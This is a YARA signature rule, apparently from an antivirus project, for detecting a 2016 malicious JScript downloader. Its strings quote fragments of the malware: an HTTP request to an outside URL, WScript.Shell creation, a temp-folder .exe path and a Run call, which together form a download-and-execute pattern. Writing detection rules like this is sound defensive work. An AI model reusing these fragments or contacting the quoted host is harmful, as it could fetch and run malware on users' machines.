rule sig_20160330_550aaf17afc73f23fa4084ed7f899a0a {
  meta:
    description = "datamaliciousorder - file 20160330_550aaf17afc73f23fa4084ed7f899a0a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "95e8cea2979e476bc908e6b2db72fef91276b5651af1da31a8800eb5a8a2d002"

  strings:
    $s1  = "K0[GF](\"GET\", \"http://epegasus.pl/m2osa\", false);" fullword ascii
    $s2  = "function U(OD, KY){L0 = L0 * 1; return OD - KY;};" fullword ascii
    $s3  = "var S1 = function T() {return WScript[Q](\"WScript\"+\".Shell\");}(), P0 = 11;" fullword ascii
    $s4  = "if (K0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function S(){return K + \"\";};" fullword ascii
    $s6  = "function SW() {return S1[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"XcI0hZE00N1S5.ex\" + \"e\";};" fullword ascii
    $s7  = "function L() {return ((B == true) && (B == EF)) ? 1 : L0;};" fullword ascii
    $s8  = "function YS(WS){S1[\"Run\"](WS, L0, L0);};" fullword ascii
    $s9  = "function F()" fullword ascii
    $s10 = "var DP = new this[\"Date\"]();" fullword ascii
    $s11 = "function VY(){return Q;};" fullword ascii
    $s12 = "return U(GA, P);" fullword ascii
    $s13 = "function OX(){return 22;};" fullword ascii
    $s14 = "function R(E) {var T0 = (1, 2, 3, 4, 5, E); return T0;};" fullword ascii
    $s15 = "}while (EC);" fullword ascii
    $s16 = "var B = false;" fullword ascii
    $s17 = "B = true; " fullword ascii
    $s18 = "EF = true; " fullword ascii
    $s19 = "var EF = false;" fullword ascii
    $s20 = "var S0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}